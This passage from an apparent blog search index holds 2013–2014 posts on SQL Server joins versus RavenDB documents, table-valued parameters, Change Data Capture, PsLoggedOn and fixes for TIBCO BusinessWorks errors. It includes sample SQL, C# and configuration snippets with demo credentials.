INSERT INTO Department(Id, Name) VALUES(1, 'Accounts') INSERT INTO Department(Id, Name) VALUES(2, 'Engineering') INSERT INTO Employee (ID, Name, DepartmentID) VALUES (1, 'Ashish', 1) INSERT INTO Employee (ID, Name, DepartmentID) VALUES (2, 'John', 2) COMMIT END TRY BEGIN CATCH ROLLBACK END CATCH If we want to retrieve name of the employee and the department in which he/she works using the employee id, need to join the two tables :- SELECT E.Name AS EmployeeName, D.Name AS DepartmentName FROM Employee E INNER JOIN Department D ON E.DepartmentID = D.Id WHERE E.Id = 1 Why we needed to join the tables? because all the information for that particular employee is not stored at one table. This is the main characteristic of a RDBMS and this is first thing we need to get off our minds in NoSQL. Now, there are different types of NoSQL databases \u2013 Raven DB, Mongo DB etc. However, in all of them, the basic element is same \u2013 No relationship! In Raven Db, the all data for this employee would be stored in a \u201cdocument\u201d. employees/1 { \"Name\": \"Ashish\", \"Department\": { \"Id\": 1, \"Name\": \"Accounts\" } } As you see \u2013 all data (which includes department details as well) for employee with id \u201c1\u201d is stored in one place \u2013 a \u201cdocument\u201d, in RavenDB terms. This is similar to a \u201crow\u201d in the RDBMS except the fact that data is not distributed in different tables, rather all data is at one place \u2013 in a document. For each employee, there would be be one document. More on this next.","title":"What is NoSQL"},{"location":"2013/05/2013-05-01-from-yessql-to-nosql-with-raven-db/#nosql-using-ravendb","text":"What is Raven Db Raven DB is a document database. It has following characteristics :- Non- Relational All data is stored and represented in JSON There is no schema Transactional","title":"NoSQL using RavenDB"},{"location":"2013/05/2013-05-01-from-yessql-to-nosql-with-raven-db/#installation","text":"http://hibernatingrhinos.com/builds/ravendb-stable I downloaded the last stable build of Raven DB and extracted to my local \u201cD:\\Ashish\\Research\\RavenDB\u201d folder. Look for /Server/RavenServer.exe.config and change the Anonymous access to \u201cAll\u201d Run the Start.cmd as an administrator. It should open a very nice looking management studio for Raven Db (performing function \u201csimilar\u201d to SQL server management studio). It will ask you to create a new database as you don\u2019t have any. Put a name for the database. The new database is created :- Client application to access and manage data in the Raven DB Adding the RavenDB client to the client application via Nuget Package manager Below is the client code which when executed creates one document per entity (in this example, a company). Notice that a DocumentStore is similar to a connection. We can use the same connection to create multiple documents. However, each document is bound to a session and that\u2019s why It needs to be disposed before creating a new one. Also notice the RabenDb displays the documents created in the server admin browser.","title":"Installation"},{"location":"2013/09/2013-09-16-sqldbtype-structured-another-gem-in-ado-net/","text":"Use case You want to insert multiple rows (say from 2 to 999 rows) from your .NET application to a database table. You are using .NET Framework 3.5 or above with SQL Server 2008 or above. Approaches Insert one row at a time As you can imagine, this would have a performance hit because of too many connections getting opened/closed \u2013 more chatty Use a CSV of rows This approach is chunkier than the above approach. Overall, below is the approach:- - Create a comma separated string of rows from the application - Send CSV to a stored procedure from application - The stored procedure would make use of a UDF to parse the CSV into a table variable - The stored procedure would insert data from the table variable to the actual table Use SqlDbType.Structured The above approach solves the problem of the application being too chatty to the database. However, It's not elegant and involves too much of \u201cmanual\u201d parsing of string. In .NET Framework 3.5 and onwards, SqlCommand can make use of another parameter type named SqlDbType.Structured which enables a .NET application to send a DataTable (yes, a \u201cSystem.Data.DataTable\u201d object) directly to the stored procedure which can be directly used as a table inside the stored procedure as If It was a table in the database. In the below example we will send a DataTable of email addresses from .NET application to a database stored procedure which would insert data directly from this table to the actual table. Steps Database changes:- /*Create a user-defined table type which will hold the contents of the DataTable passed from the application. This will be used as a Table Valued Parameter. */ CREATE TYPE [dbo].[EmailAddressList] AS TABLE ( [EmailAddress] [NVARCHAR](100) NULL ); /*Create the actual table to which we will insert data from the DataTable*/ CREATE TABLE EmailAddressDetails ( EmailAddress NVARCHAR(100), CreatedOn DateTime DEFAULT GetDate() ) /*Create the stored procedure which will be called from the application*/ CREATE PROCEDURE EmailAddresses_InsertBatch @EmailAddressBatch [EmailAddressList] READONLY AS BEGIN INSERT INTO EmailAddressDetails (EmailAddress) SELECT E.EmailAddress FROM @EmailAddressBatch E END Application changes //Function to create a DataTable with dummy email addresses //The DataTable created here should match the schema of the User defined table type created above. private DataTable CreateEmailAddressDataTable() { DataTable emailAddressDT = new DataTable(); emailAddressDT.Columns.Add(\"EmailAddress\", typeof(string)); int emailAddrressCount = 100; for (int i = 0; i < emailAddrressCount; i++) { DataRow row = emailAddressDT.NewRow(); row[\"EmailAddress\"] = i.ToString() + \".something@xyz.com\"; emailAddressDT.Rows.Add(row); } return emailAddressDT; } //Function to call the stored procedure with DataTable private void AddEmailAddressToDb() { DataTable dataTable = CreateEmailAddressDataTable(); string connectionString = \"Server=YourServerName;Database=YourDatabaseName;UserId=ashish;Password=ashish;\"; using (SqlConnection connection = new SqlConnection(connectionString)) { using (SqlCommand command = new SqlCommand()) { connection.Open(); command.Connection = connection; command.CommandText = \"EmailAddresses_InsertBatch\"; command.CommandType = CommandType.StoredProcedure; var param = new SqlParameter(\"@EmailAddressBatch\", SqlDbType.Structured); param.TypeName = \"dbo.EmailAddressList\"; param.Value = dataTable; command.Parameters.Add(param); command.ExecuteNonQuery(); } } } The above line highlighted in green is the gem in ADO.NET. :-) When we send DataTable the stored procedure, It populates the user defined table type which we can directly use in the stored procedure \u2013 inserting from it to the actual table in this case. No parsing of CSV in UDF \u2013 takes away big pain when you have a complex structure. Note: - Microsoft recommends this to be used when you are inserting less than 1000 rows. For more rows, consider using SqlBulkCopy.","title":"SqlDbType.Structured [another gem in ADO.NET] and Bulk insert using Table Valued Parameters"},{"location":"2013/10/2013-10-23-sql-serverchange-data-capture-cdc-for-watching-database-tables-for-dml-operations/","text":"In scenarios when we want to watch tables for any inserts, updates and deletes, we implement triggers. Triggers \u2013 not only needs database development effort and needs to be correctly written, It places locks on tables and slows things down. In SQL Server 2008, Microsoft introduced a new capability called \u201cChange Data Capture\u201d [CDC] to watch and track changes on tables for any inserts, updates and deletes. This requires almost no database development effort and is more efficient than triggers. A very nice thing about CDC is that It makes use of transaction log which has all the data about any changes made to the database already \u2013 So why reinvent the wheel? Basically, first you enable CDC on the database. Then enable CDC on the table (e.g. Account) you want to watch which will automatically create the a change tracking table (\u201cAccount_CT\u201d) for the watched table. Any changes in your watched table (e.g. Account) will get recorded in the change tracking table (e.g Account_CT) and you can use the tracking table for all your queries. \u201cTalk is cheap. Show me the code.\u201d \u2013 Linus Torvalds 1. Preparing sample data /*Create sample database*/ _USE [master] GO IF EXISTS (SELECT name FROM sys.databases WHERE name = N'ChangeDataCaptureTest') DROP DATABASE [ChangeDataCaptureTest] GO /****** Object: Database [ChangeDataCaptureTest] Script Date: 10/23/2013 17:25:04 ******/ CREATE DATABASE [ChangeDataCaptureTest] /*Create the sample table \u2013 This is the table we will be watching for inserts, updates and deletes*/ _USE ChangeDataCaptureTest GO CREATE TABLE [Account] ( Id INT Primary Key IDENTITY(1,1), [Description] VARCHAR(500), [Active] BIT ) GO 2. Enable CDC on the database This looks scary, but all it is doing it is checking an already existing flag in sys.databases table in the master database. If you execute the following, you can see in which database CDC is currently enabled. In the below example, It is not enabled in any of the database:- USE master GO SELECT [name], database_id, is_cdc_enabled FROM sys.databases GO Now we can enable CDC on our sample database. USE ChangeDataCaptureTest GO EXEC sys.sp_cdc_enable_db GO If you execute the following, you can see the \u201cis_cdc_enabled\u201d column for our sample database is enabled:- USE master GO SELECT [name], database_id, is_cdc_enabled FROM sys.databases GO 3. Enable CDC on the table you want to watch for Insert/Update/Delete Now we need to enable the CDC on the table we want to watch. USE ChangeDataCaptureTest GO EXEC sys.sp_cdc_enable_table @source_schema = N'dbo', @source_name = N' Account ', @role_name = NULL GO When we execute the above, we see two Sql jobs created and started automatically. cdc.ChangeDataCaptureTest_capture \u2013 This job watches the table \u201cAccounts\u201d and put changes in the tracking table Account_CT cdc.ChangeDataCaptureTest_cleanup - This job cleans up the tracking table Account_CT and can be scheduled as per the requirement. At this point If we query the sys.tables :- _USE ChangeDataCaptureTest GO SELECT [name], is_tracked_by_cdc FROM sys.tables GO _ 4. Testing the results Let us insert/update/delete data in the watched table [Account] and see the tracked changes in the [Account_CT] table. Insert Operation _USE ChangeDataCaptureTest GO INSERT INTO Account VALUES ('Test', 1) _ Select to verify results _USE ChangeDataCaptureTest GO SELECT * FROM Account GO SELECT * FROM cdc.dbo_Account_CT GO _ Value for \u201c__$operation\u201d column is 2 indicates \u201cInsert\u201d. We can see the values in the columns \u201cDescription\u201d and \u201cActive\u201d. Update operation USE ChangeDataCaptureTest GO UPDATE Account SET Active= 0 WHERE Id = 1 Select to verify the results USE ChangeDataCaptureTest GO SELECT * FROM Account GO SELECT * FROM cdc.dbo_Account_CT GO Value for \u201c__$operation\u201d column :- 3 = update (captured column values are those before the update operation). 4 = update (captured column values are those after the update operation) DELETE Operations USE ChangeDataCaptureTest GO DELETE Account WHERE id = 1 Select to verify results USE ChangeDataCaptureTest GO SELECT * FROM Account GO SELECT * FROM cdc.dbo_Account_CT GO Value for \u201c__$operation\u201d column is 2 indicates \u201cDelete\u201d. Time based search on table changes Need to see changes in a table based on given timestamp? No problem. When we enabled the table for change tracking, It also added a system table named \u201ccdc.lsn_time_mapping\u201d which has all the transaction with the timestamp. Just join the change tracking table (Account_CT) with the system table \u201ccdc.lsn_time_mapping\u201d table on transaction id (start_lsn) and have the transaction filter criteria on the same. USE ChangeDataCaptureTest GO SELECT B.*, A.tran_begin_time, A.tran_end_time FROM cdc.lsn_time_mapping A INNER JOIN cdc.dbo_Account_CT B ON A.start_lsn = B.__$start_lsn Note :- In CDC, there's no way to trace the user who causes each transaction .","title":"SQL Server&ndash;Change Data Capture [CDC] for &ldquo;Watching&rdquo; database tables for DML operations"},{"location":"2013/10/2013-10-23-sql-serverchange-data-capture-cdc-for-watching-database-tables-for-dml-operations/#1-preparing-sample-data","text":"/*Create sample database*/ _USE [master] GO IF EXISTS (SELECT name FROM sys.databases WHERE name = N'ChangeDataCaptureTest') DROP DATABASE [ChangeDataCaptureTest] GO /****** Object: Database [ChangeDataCaptureTest] Script Date: 10/23/2013 17:25:04 ******/ CREATE DATABASE [ChangeDataCaptureTest] /*Create the sample table \u2013 This is the table we will be watching for inserts, updates and deletes*/ _USE ChangeDataCaptureTest GO CREATE TABLE [Account] ( Id INT Primary Key IDENTITY(1,1), [Description] VARCHAR(500), [Active] BIT ) GO","title":"1. Preparing sample data"},{"location":"2013/10/2013-10-23-sql-serverchange-data-capture-cdc-for-watching-database-tables-for-dml-operations/#2-enable-cdc-on-the-database","text":"This looks scary, but all it is doing it is checking an already existing flag in sys.databases table in the master database. If you execute the following, you can see in which database CDC is currently enabled. In the below example, It is not enabled in any of the database:- USE master GO SELECT [name], database_id, is_cdc_enabled FROM sys.databases GO Now we can enable CDC on our sample database. USE ChangeDataCaptureTest GO EXEC sys.sp_cdc_enable_db GO If you execute the following, you can see the \u201cis_cdc_enabled\u201d column for our sample database is enabled:- USE master GO SELECT [name], database_id, is_cdc_enabled FROM sys.databases GO","title":"2. Enable CDC on the database"},{"location":"2013/10/2013-10-23-sql-serverchange-data-capture-cdc-for-watching-database-tables-for-dml-operations/#3-enable-cdc-on-the-table-you-want-to-watch-for-insertupdatedelete","text":"Now we need to enable the CDC on the table we want to watch. USE ChangeDataCaptureTest GO EXEC sys.sp_cdc_enable_table @source_schema = N'dbo', @source_name = N' Account ', @role_name = NULL GO When we execute the above, we see two Sql jobs created and started automatically. cdc.ChangeDataCaptureTest_capture \u2013 This job watches the table \u201cAccounts\u201d and put changes in the tracking table Account_CT cdc.ChangeDataCaptureTest_cleanup - This job cleans up the tracking table Account_CT and can be scheduled as per the requirement. At this point If we query the sys.tables :- _USE ChangeDataCaptureTest GO SELECT [name], is_tracked_by_cdc FROM sys.tables GO _","title":"3. Enable CDC on the table you want to watch for Insert/Update/Delete"},{"location":"2013/10/2013-10-23-sql-serverchange-data-capture-cdc-for-watching-database-tables-for-dml-operations/#4-testing-the-results","text":"Let us insert/update/delete data in the watched table [Account] and see the tracked changes in the [Account_CT] table. Insert Operation _USE ChangeDataCaptureTest GO INSERT INTO Account VALUES ('Test', 1) _ Select to verify results _USE ChangeDataCaptureTest GO SELECT * FROM Account GO SELECT * FROM cdc.dbo_Account_CT GO _ Value for \u201c__$operation\u201d column is 2 indicates \u201cInsert\u201d. We can see the values in the columns \u201cDescription\u201d and \u201cActive\u201d. Update operation USE ChangeDataCaptureTest GO UPDATE Account SET Active= 0 WHERE Id = 1 Select to verify the results USE ChangeDataCaptureTest GO SELECT * FROM Account GO SELECT * FROM cdc.dbo_Account_CT GO Value for \u201c__$operation\u201d column :- 3 = update (captured column values are those before the update operation). 4 = update (captured column values are those after the update operation) DELETE Operations USE ChangeDataCaptureTest GO DELETE Account WHERE id = 1 Select to verify results USE ChangeDataCaptureTest GO SELECT * FROM Account GO SELECT * FROM cdc.dbo_Account_CT GO Value for \u201c__$operation\u201d column is 2 indicates \u201cDelete\u201d. Time based search on table changes Need to see changes in a table based on given timestamp? No problem. When we enabled the table for change tracking, It also added a system table named \u201ccdc.lsn_time_mapping\u201d which has all the transaction with the timestamp. Just join the change tracking table (Account_CT) with the system table \u201ccdc.lsn_time_mapping\u201d table on transaction id (start_lsn) and have the transaction filter criteria on the same. USE ChangeDataCaptureTest GO SELECT B.*, A.tran_begin_time, A.tran_end_time FROM cdc.lsn_time_mapping A INNER JOIN cdc.dbo_Account_CT B ON A.start_lsn = B.__$start_lsn Note :- In CDC, there's no way to trace the user who causes each transaction .","title":"4. Testing the results"},{"location":"2013/12/2013-12-31-2013-in-review/","text":"The WordPress.com stats helper monkeys prepared a 2013 annual report for this blog. Here's an excerpt: The concert hall at the Sydney Opera House holds 2,700 people. This blog was viewed about 9,200 times in 2013. If it were a concert at Sydney Opera House, it would take about 3 sold-out performances for that many people to see it. Click here to see the complete report.","title":"2013 in review"},{"location":"2014/01/2014-01-23-maximum-connection-exceeded-how-to-know-who-are-logged-on-to-a-server-and-not-letting-you-in/","text":"We all hate to see this message when we want to login to the server :- \u201cThe terminal server has exceeded the maximum number of allowed connections.\u201d All you need is the PsLoggedOn utility from sysInternals (now owned by Microsoft). Another reason we should all love Mark Russinovich and SysInternal tools. Just follow the steps :- Download PSTools from here . Extract the zip file to a folder. Open command prompt and navigate to the extracted folder. Run the following command. Keep the \\\\ and replace the MachineName with the fully qualified name of the machine where you want to see who are currently logged on. 5. You will see who are logged on to that machine. psloggedon \\\\MachineName This saves you sending emails to a group to find out who are logged into the server. Rather \u2013 because you know who are logged in, you would ping/email those specific users, asking them to log off.","title":"Maximum connections exceeded!!!! - How to know who are logged on to a server and not letting you in?"},{"location":"2014/01/2014-01-30-sql-server-job-cannot-insert-the-value-null-into-column-owner_sid-table-msdb-dbo-sysjobs/","text":"I needed to script out a Sql job one Sql server (server1) and use the same script to create the same job on a different Sql server machine(server2). So, I scripted out the job from Server1 and ran the same on the Server2 and got the below error :- Cannot insert the value NULL into column \u2018owner_sid\u2019, table \u2018msdb.dbo.sysjobs\u2019 Looking at more closely on the script, I noticed that the the script I created from the job on the Server1 also has the login which I used to login to Server1. This login is different from the one I was using to run the script on server2. See the highlighted login in the below screenshot. Once I changed the script to put the login I am using to run the script on server2, the script ran fine and the job got created in the Server2.","title":"Sql Server job - Cannot insert the value NULL into column &lsquo;owner_sid&rsquo;, table &lsquo;msdb.dbo.sysjobs&rsquo;"},{"location":"2014/02/2014-02-03-tibco-businessworks-bw-jdbc-100034-configuration-test-failed-exception-com-microsoft-sqlserver-jdbc-sqlserverexception-occurred-com-microsoft-sqlserver-jdbc-sqlserverexception-connection/","text":"BW-JDBC-100034 \"Configuration Test Failed. Exception [com.microsoft.sqlserver.jdbc.SQLServerException] occurred. com.microsoft.sqlserver.jdbc.SQLServerException: Connection reset http://schemas.tibco.com/bw/plugins/jdbc/5.0/jdbcExceptions \"> \"JDBC error reported: (SQLState = 08S01) - com.microsoft.sqlserver.jdbc.SQLServerException: Connection reset ClientConnectionId:396457ef-182e-4ddb-8b50-57541ce45b3b\" BW-JDBC-100014 08S01 com.microsoft.sqlserver.jdbc.SQLServerException: Connection reset ClientConnectionId:396457ef-182e-4ddb-8b50-57541ce45b3b I saw this issue in a Tibco BusinessWorks application using a SQL JDBC Driver 4.0 to connect to a SQL server 2008 R2 server. However, I believe that this could happen with any application written in Java/.NET using JDBC driver 4.0 connecting to SQL server 2008 R2 server. Solution :- Check If at least Microsoft\u00ae SQL Server\u00ae 2008 R2 Service Pack 2 is installed on the SQL server. If not, install it. If SP2 or Higher (e.g. SP3) is already installed and you still see the same issue \u2013 problem is something else. How to check If at least SP2 is installed? Connect to the server from the SQL Management Studio and execute the below query :- SELECT @@VERSION. You should see the SP2 as the part of result Why :- See below :- http://support.microsoft.com/kb/2653857 _FIX: You cannot connect to SQL Server by using JDBC Driver for SQL Server after you upgrade to JRE 6 update 29 or a later version _ What If you can not install SP2 We should always update latest service packs on the SQL server \u2013 not only for this issue. However, If you couldn\u2019t and you had to live with current database server install \u2013 try using the below attribute in your TRA files. java.property.TIBCO_SECURITY_VENDOR=j2se If you are trying to test connection from the Tibco BusinessWorks Designer, add the above attribute in your \\designer\\5.8\\bin\\designer.tra file. If you want to deploy this change, add the above attribute in your \\domain\\ \\application\\ \\ .tra file and restart the service instances of the application. NOTE:- This same issue does not happen when you connect to Sql server 2005. That\u2019s weird! Sounds like somebody broke something in Sql 2008 R2 and fixed it in SP2. Additional information Version number for SQL server in RTM and service packs. [Source : http://sqlserverbuilds.blogspot.com/ ]","title":"Tibco BusinessWorks - BW-JDBC-100034 &quot;Configuration Test Failed. Exception [com.microsoft.sqlserver.jdbc.SQLServerException] occurred. com.microsoft.sqlserver.jdbc.SQLServerException: Connection reset"},{"location":"2014/02/2014-02-25-unable-to-deploy-tibco-bw-application-after-configuring-tibco-bw-process-monitor-error-tra-000000-streamgobblererror-data-java-lang-noclassdeffounderror-comtibcoprocessmonitorclient/","text":"As a part of Tibco BusinessWorks Process monitor, one needs to add following properties to the bwengine.tra file in the Tibco BusinessWorks machine. BW ProcessMonitor properties java.start.class=com.tibco.processmonitor.client.run tibco.clientVar.nJAMS/logMode=complete tibco.clientVar.nJAMS/DataProvider/JMS/useJNDI=true tibco.clientVar.nJAMS/DataProvider/JMS/useQueues=true tibco.clientVar.nJAMS/DataProvider/JMS/destination=bwpm tibco.clientVar.nJAMS/DataProvider/JMS/enabled=true tibco.clientVar.nJAMS/DataProvider/JMS/user=admin tibco.clientVar.nJAMS/DataProvider/JMS/password= tibco.clientVar.nJAMS/DataProvider/JMS/server=tibjmsnaming\\://My_EMS_IPAddress\\:7222 tibco.clientVar.nJAMS/DataProvider/JMS/contextFactory=com.tibco.tibjms.naming.TibjmsInitialContextFactory tibco.clientVar.nJAMS/DataProvider/JMS/connectionFactory=QueueConnectionFactory tibco.clientVar.nJAMS/DataProvider/EngineLog/enabled=false Added the above and after that I couldn\u2019t deploy any BW application in our Tibco Administrator. The tsm.log showed the below error each time I attempted to deploy an application. [TRA-000000] StreamGobbler(ERROR) : data = java.lang.NoClassDefFoundError: com/tibco/processmonitor/client/run Caused by: java.lang.ClassNotFoundException: com.tibco.processmonitor.client.run [TRA-000000] StreamGobbler(ERROR) : data = java.lang.NoClassDefFoundError: com/tibco/processmonitor/client/run Caused by: java.lang.ClassNotFoundException: com.tibco.processmonitor.client.run at java.net.URLClassLoader$1.run(Unknown Source) at ava.net.URLClassLoader$1.run(Unknown Source) at java.security.AccessController.doPrivileged(Native Method) at java.net.URLClassLoader.findClass(Unknown Source) at java.lang.ClassLoader.loadClass(Unknown Source) at sun.misc.Launcher$AppClassLoader.loadClass(Unknown Source) at java.lang.ClassLoader.loadClass(Unknown Source) The first line of the list of properties we added to the bwengine.tra has following :- java.start.class=com.tibco.processmonitor.client.run Of course \u2013 It was bwengine was not to find that class. Started looking into which jar would contain this file and It turns out to be bwpm.jar which comes as a part of BWPM install package. Adding that bwpm.jar to C:\\tibco\\bw\\5.10\\lib resolved the issue and I could deploy BW apps to BW classic admin without any issues.","title":"Unable to deploy Tibco BW application after configuring  Tibco BW Process Monitor  - ERROR -  [TRA-000000] StreamGobbler(ERROR) : data = java.lang.NoClassDefFoundError: com/tibco/processmonitor/client/run Caused by: java.lang.ClassNotFoundException: com.tibco.processmonitor.client.run"},{"location":"2014/02/2014-02-25-unable-to-deploy-tibco-bw-application-after-configuring-tibco-bw-process-monitor-error-tra-000000-streamgobblererror-data-java-lang-noclassdeffounderror-comtibcoprocessmonitorclient/#bw-processmonitor-properties-javastartclasscomtibcoprocessmonitorclientrun-tibcoclientvarnjamslogmodecomplete-tibcoclientvarnjamsdataproviderjmsusejnditrue-tibcoclientvarnjamsdataproviderjmsusequeuestrue-tibcoclientvarnjamsdataproviderjmsdestinationbwpm-tibcoclientvarnjamsdataproviderjmsenabledtrue-tibcoclientvarnjamsdataproviderjmsuseradmin-tibcoclientvarnjamsdataproviderjmspassword-tibcoclientvarnjamsdataproviderjmsservertibjmsnamingmy_ems_ipaddress7222-tibcoclientvarnjamsdataproviderjmscontextfactorycomtibcotibjmsnamingtibjmsinitialcontextfactory-tibcoclientvarnjamsdataproviderjmsconnectionfactoryqueueconnectionfactory-tibcoclientvarnjamsdataproviderenginelogenabledfalse","text":"Added the above and after that I couldn\u2019t deploy any BW application in our Tibco Administrator. The tsm.log showed the below error each time I attempted to deploy an application. [TRA-000000] StreamGobbler(ERROR) : data = java.lang.NoClassDefFoundError: com/tibco/processmonitor/client/run Caused by: java.lang.ClassNotFoundException: com.tibco.processmonitor.client.run [TRA-000000] StreamGobbler(ERROR) : data = java.lang.NoClassDefFoundError: com/tibco/processmonitor/client/run Caused by: java.lang.ClassNotFoundException: com.tibco.processmonitor.client.run at java.net.URLClassLoader$1.run(Unknown Source) at ava.net.URLClassLoader$1.run(Unknown Source) at java.security.AccessController.doPrivileged(Native Method) at java.net.URLClassLoader.findClass(Unknown Source) at java.lang.ClassLoader.loadClass(Unknown Source) at sun.misc.Launcher$AppClassLoader.loadClass(Unknown Source) at java.lang.ClassLoader.loadClass(Unknown Source) The first line of the list of properties we added to the bwengine.tra has following :- java.start.class=com.tibco.processmonitor.client.run Of course \u2013 It was bwengine was not to find that class. Started looking into which jar would contain this file and It turns out to be bwpm.jar which comes as a part of BWPM install package. Adding that bwpm.jar to C:\\tibco\\bw\\5.10\\lib resolved the issue and I could deploy BW apps to BW classic admin without any issues.","title":"BW ProcessMonitor properties java.start.class=com.tibco.processmonitor.client.run tibco.clientVar.nJAMS/logMode=complete tibco.clientVar.nJAMS/DataProvider/JMS/useJNDI=true tibco.clientVar.nJAMS/DataProvider/JMS/useQueues=true tibco.clientVar.nJAMS/DataProvider/JMS/destination=bwpm tibco.clientVar.nJAMS/DataProvider/JMS/enabled=true tibco.clientVar.nJAMS/DataProvider/JMS/user=admin tibco.clientVar.nJAMS/DataProvider/JMS/password= tibco.clientVar.nJAMS/DataProvider/JMS/server=tibjmsnaming\\://My_EMS_IPAddress\\:7222 tibco.clientVar.nJAMS/DataProvider/JMS/contextFactory=com.tibco.tibjms.naming.TibjmsInitialContextFactory tibco.clientVar.nJAMS/DataProvider/JMS/connectionFactory=QueueConnectionFactory tibco.clientVar.nJAMS/DataProvider/EngineLog/enabled=false"},{"location":"2014/02/2014-02-28-tibco-cloud-bus-a-sneak-peek/","text":"In the below screenshot, look at the URL closely and you will notice the highlighted Amazon AWS. Yes \u2013 this is the TIBCO Classic Administrator hosted on TIBCO Cloud Bus which leverages Amazon Web Services for Its cloud computing platform. If this catches your attention \u2013 read on\u2026.. TIBCO Cloud Bus is a subscription-based Integration Platform-as-a-Service (iPaaS). What? Another \u201cAs-A-Service\u201d buzzword? Simply put - iPaaS allows integration between cloud to cloud applications and also between cloud to on-premises applications. Cloud to on-premises application integration is important because financial services companies which need to follow many security and regulatory compliances might need to keep some applications in house on as well as want to keep other applications hosted on TIBCO Cloud bus with seamless integration between on premises and cloud apps. Hosting the apps on cloud means you don\u2019t need your IT infrastructure team to set up an environment for you to deploy your application. In TIBCO cloud bus, you can provision your own TIBCO environment in really really short time before you quickly deploy your applications. TIBCO Cloud bus can increase/decrease the number of machines that sit behind the services. It knows what the load on the application is and then automatically increase/decrease the horsepower required for the application. For the connectivity from the TIBCO Cloud Bus to on premise TIBCO infrastructure , TIBCO Cloud Bus has to connect through VPN gateway from the public cloud to company\u2019s datacenter. This would involve setting up VPN tunnel at company\u2019s end which may involve company\u2019s IT as well. At the time of writing this, I have two areas to be research in TIBCO Cloud Bus. Will edit this post when I have done some more research \u2013 hopefully with some answers. 1) Cost Effectiveness How cost effective is TIBCO Cloud bus VS on-premises TIBCO setup over a longer period of time? Why an organization won\u2019t continue to grow on in-control on-premises infrastructure to host TIBCO services rather than using TIBCO cloud bus If it is not saving costs over a period of time. Need some case studies and statistics. 2) Security How TIBCO Cloud Bus addresses the security concerns when It comes to hosting all the apps on the cloud OR integration between on-premises applications and cloud applications? Need some case studies. All said and done, IMHO, we must acknowledge that cloud computing NOT just a buzzword anymore now. Its for real and here to stay. So when TIBCO, one of the leaders in integration and middleware industry has something to offer in this space, we just need to keep an eye on it \u2013 if not necessarily adopting the offering immediately. If you are already bored of reading, try TIBCO Cloud Bus yourself (30 days trial) \u2013 If you need help in that, I have some help below. I have steps-by-step instructions on how to set up a TIBCO Cloud Bus environment below. Good Luck and Happy Learning! Setting up a TIBCO Cloud Bus environment Note :- For below steps,use Mozilla Firefox for browsing the Cloud Bus If you can. \u2013 I have seen issues in IE/Chrome. 1) Go to cloudbus.tibco.com . 2) Enter your TIBCO Access Point credentials. If you are not registered there, register at tap.tibco.com and use the same login and password here. 3) If you have the TIBCO BW installed in your machine. You already have the development environment and you can skip this step. If you don\u2019t, you can download the installers. Click on Develop > TIBCO Cloud Bus Designer (Windows 64-bit) [If you have 64-bit windows installed] The TIBCO Cloud Business Designer has following in it. a) Extract the zip file. b) Open the silent file, Install-Designer.silent, in a text editor. c) Review the license files in the license folder. If you accept the licenses, change the entry key to true in the silent file. d) Change the entry key to your extracted temporary folder: C:\\temp\\TIB_tcb-designer_1.0.0_win_x86_64 e) Optionally update the values for the and keys. f) Save the silent file. g) Run the installer: Install-Designer.cmd h) After the installation is complete, start TIBCO Designer from the Windows Startup menu: Choose All Programs > TIBCO > Cloud Environment > TIBCO Designer 5.8. 4) Click on the deploy button to see the highlighted \u201cSkyway\u201d button. 5) Click on \u201cCloud Bus Starter Template\u201d link to provision the BW, EMS and admin stack. 6) See more information on the stack we are going to provision 7) Clicking on \u201cProceed with Provisioning\u201d will ask you to complete the required fields. 8) Click on Edit 9) I put the below values and click on Apply Button. Then click on the \u201cProceed with Provisioning\u201d button. Fields Values Stack Name AshishTibcoCloudBus TIBCO Domain Name TibcoAdminOnCloud TIBCO Domain User Admin TIBCO Domain password ashish@123 EMS user Admin EMS password admin 10) Initializing stack 11) Click Start to initialize the stack 12) Stack provisioning started 13) Stack is running 14) If you click on the \u201cTibco Admin URL\u201d link above, the Tibco Admin is opened in a separate window. That\u2019s right \u2013 this TIBCO admin is running on cloud. 15) That\u2019s it \u2013 you can deploy any TIBCO App to TIBCO Cloud bus as just like you did on your on-premises infrastructure \u2013 Just like I did \u2013 shown in the below screenshot.","title":"TIBCO Cloud Bus &ndash; At a glance and more&hellip;."},{"location":"2014/02/2014-02-28-tibco-cloud-bus-a-sneak-peek/#setting-up-a-tibco-cloud-bus-environment","text":"Note :- For below steps,use Mozilla Firefox for browsing the Cloud Bus If you can. \u2013 I have seen issues in IE/Chrome. 1) Go to cloudbus.tibco.com . 2) Enter your TIBCO Access Point credentials. If you are not registered there, register at tap.tibco.com and use the same login and password here. 3) If you have the TIBCO BW installed in your machine. You already have the development environment and you can skip this step. If you don\u2019t, you can download the installers. Click on Develop > TIBCO Cloud Bus Designer (Windows 64-bit) [If you have 64-bit windows installed] The TIBCO Cloud Business Designer has following in it. a) Extract the zip file. b) Open the silent file, Install-Designer.silent, in a text editor. c) Review the license files in the license folder. If you accept the licenses, change the entry key to true in the silent file. d) Change the entry key to your extracted temporary folder: C:\\temp\\TIB_tcb-designer_1.0.0_win_x86_64 e) Optionally update the values for the and keys. f) Save the silent file. g) Run the installer: Install-Designer.cmd h) After the installation is complete, start TIBCO Designer from the Windows Startup menu: Choose All Programs > TIBCO > Cloud Environment > TIBCO Designer 5.8. 4) Click on the deploy button to see the highlighted \u201cSkyway\u201d button. 5) Click on \u201cCloud Bus Starter Template\u201d link to provision the BW, EMS and admin stack. 6) See more information on the stack we are going to provision 7) Clicking on \u201cProceed with Provisioning\u201d will ask you to complete the required fields. 8) Click on Edit 9) I put the below values and click on Apply Button. Then click on the \u201cProceed with Provisioning\u201d button. Fields Values Stack Name AshishTibcoCloudBus TIBCO Domain Name TibcoAdminOnCloud TIBCO Domain User Admin TIBCO Domain password ashish@123 EMS user Admin EMS password admin 10) Initializing stack 11) Click Start to initialize the stack 12) Stack provisioning started 13) Stack is running 14) If you click on the \u201cTibco Admin URL\u201d link above, the Tibco Admin is opened in a separate window. That\u2019s right \u2013 this TIBCO admin is running on cloud. 15) That\u2019s it \u2013 you can deploy any TIBCO App to TIBCO Cloud bus as just like you did on your on-premises infrastructure \u2013 Just like I did \u2013 shown in the below screenshot.","title":"Setting up a TIBCO Cloud Bus environment"},{"location":"2014/03/2014-03-12-tibco-businessworks-bw-jdbc-100034-configuration-test-failed-exception-com-microsoft-sqlserver-jdbc-sqlserverexception-occurred-com-microsoft-sqlserver-jdbc-sqlserverexception-connection-2/","text":"","title":"Tibco BusinessWorks - BW-JDBC-100034 &quot;Configuration Test Failed. Exception [com.microsoft.sqlserver.jdbc.SQLServerException] occurred. com.microsoft.sqlserver.jdbc.SQLServerException: Connection reset"},{"location":"2014/04/2014-04-08-tibco-businessevents-5-1-studio-jms-test-connection-failed/","text":"Just in case you are facing JMS 